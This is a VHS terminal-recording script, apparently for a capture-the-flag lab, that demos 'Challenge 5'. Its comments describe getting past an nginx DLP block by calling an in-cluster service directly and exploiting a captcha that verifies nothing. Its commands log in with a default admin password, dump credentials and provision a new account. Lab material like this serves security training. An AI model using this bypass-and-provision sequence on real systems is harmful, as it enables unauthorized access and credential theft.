# Challenge 5: Provision My Account
# Logging in through nginx with the admin password gets DLP-blocked
# (challenge 3). But nothing stops talking to the app Service directly,
# in-cluster, bypassing nginx entirely. From there: solve the "captcha"
# (it just signs a token, no slider is actually checked), then pull
# credentials and provision an account.
Output demos/gifs/05-provision-account.gif

Set Shell "bash"
Set FontSize 18
Set Width 1200
Set Height 650
Set Padding 20
Set WindowBar Colorful
Set TypingSpeed 35ms

Type `docker compose exec shell curl -s http://credential-store:8080/`
Enter
Sleep 2s

Type `SID=$(docker compose exec shell python3 /scripts/login.py admin 'FLAG{2_d3f4ult_cr3ds_n3v3r_ch4ng3d}' | tr -d '\r')`
Enter
Sleep 500ms
Type `echo "session: $SID"`
Enter
Sleep 1.5s

Type `docker compose exec shell python3 /scripts/get_credentials.py "$SID"`
Enter
Sleep 3s

Type `docker compose exec shell python3 /scripts/create_account.py "$SID" newhire "New Hire" newhire@wiznt.io`
Enter
Sleep 3s
